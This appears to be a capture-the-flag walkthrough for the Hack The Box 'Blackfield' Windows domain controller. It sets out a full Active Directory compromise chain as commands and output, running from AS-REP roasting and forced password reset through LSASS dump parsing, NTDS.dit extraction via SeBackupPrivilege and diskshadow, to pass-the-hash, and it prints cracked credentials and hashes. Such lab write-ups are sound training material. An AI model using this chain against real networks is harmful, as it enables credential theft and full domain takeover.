---
title: "HTB: Blackfield"
date: 2023-11-10
draft: false
os: "Windows"
difficulty: "Hard"
platform: "HTB"
aliases: ["/posts/htb/blackfield/"]
tags:
  - htb
  - hard
  - windows
  - active-directory
  - as-rep-roasting
  - bloodhound
  - force-change-password
  - lsass-dump
  - sebackupprivilege
  - diskshadow
  - ntds
categories:
  - walkthrough
---

{{< box-info name="Blackfield" os="Windows" difficulty="Hard" ip="10.129.229.17" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  ncacn_http
3268/tcp open  ldap
5985/tcp open  http
```
{{< /collapse >}}

Domain: `blackfield.local`, DC01.

### SMB - Null Access

SMB null authentication gives access to two interesting shares:

```
profiles$     READ       (user profile directories)
forensic                 (Forensic / Audit share - no access yet)
```

The `profiles$` share contains hundreds of user profile directories -- a ready-made username list for Kerberos enumeration.

### Kerbrute

Using the profile names as a wordlist:

```bash
kerbrute userenum --dc 10.129.229.17 -d "blackfield.local" userlist

[+] VALID USERNAME: audit2020@BLACKFIELD.LOCAL
[+] VALID USERNAME: svc_backup@BLACKFIELD.LOCAL
[+] VALID USERNAME: support@BLACKFIELD.LOCAL
```

---

## Foothold

### AS-REP Roasting → support

The `support` account doesn't require Kerberos pre-authentication:

```bash
impacket-GetNPUsers blackfield.local/support \
  -format john -outputfile hash -dc-ip 10.129.229.17 -no-pass
```

Crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)
```

Credentials: `support:#00^BlackKnight` -- but no direct shell access.

---

## Lateral Movement

### Stage 1: ForceChangePassword → audit2020

Running BloodHound with support's credentials reveals that `support` has `ForceChangePassword` rights over `audit2020`:

```bash
bloodhound-python -ns 10.129.229.17 -d 'blackfield.local' \
  -dc 'DC01.blackfield.local' -u 'support' -p '#00^BlackKnight'
```

Change audit2020's password without knowing the original:

```bash
net rpc password 'audit2020' 'Pa$$w0rd2023!' \
  -U 'blackfield.local/support%#00^BlackKnight' -S 10.129.229.17
```

### Stage 2: LSASS Dump → svc_backup

As `audit2020`, we now have access to the `forensic` share. Inside it -- an `lsass.DMP` file. Extract credentials locally with pypykatz:

```bash
pypykatz lsa minidump lsass.DMP
```

The dump contains an NTLM hash for `svc_backup`:

```
Username: svc_backup
Domain: BLACKFIELD
NT: 9658d1d1dcd9250115e2205d9f48400d
```

The Administrator hash from the dump is stale, but `svc_backup`'s hash works -- WinRM access confirmed.

---

## Privilege Escalation

### SeBackupPrivilege → NTDS.dit

`svc_backup` has `SeBackupPrivilege` and `SeRestorePrivilege` -- enough to read any file on the system, including the AD database.

Create a disk shadow script to snapshot and expose the C: drive:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Execute the full chain:

```powershell
# Create shadow copy and mount as E:
diskshadow /s bkp.txt

# Copy NTDS.dit from the shadow (robocopy /b bypasses ACLs)
robocopy /b E:\Windows\ntds . ntds.dit

# Grab the SYSTEM hive to decrypt
reg save hklm\system C:\Users\svc_backup\Downloads\system
```

Dump everything locally:

```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

Pass-the-hash as Administrator:

```bash
evil-winrm -i 10.129.229.17 -u 'Administrator' \
  -H '184fb5e5178480be64824d4cd53b99ee'
```

---

## Proof

{{< terminal title="root@blackfield" >}}
whoami
blackfield\administrator
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- SMB shares with user profile directories are free username lists for Kerberos enumeration
- BloodHound's `ForceChangePassword` edge is often overlooked -- it doesn't require knowing the current password
- LSASS dumps from forensic shares are goldmines, but beware of stale hashes -- always verify before assuming access
- `SeBackupPrivilege` is a domain compromise path: diskshadow + robocopy /b to grab NTDS.dit, then secretsdump offline
{{< /callout >}}
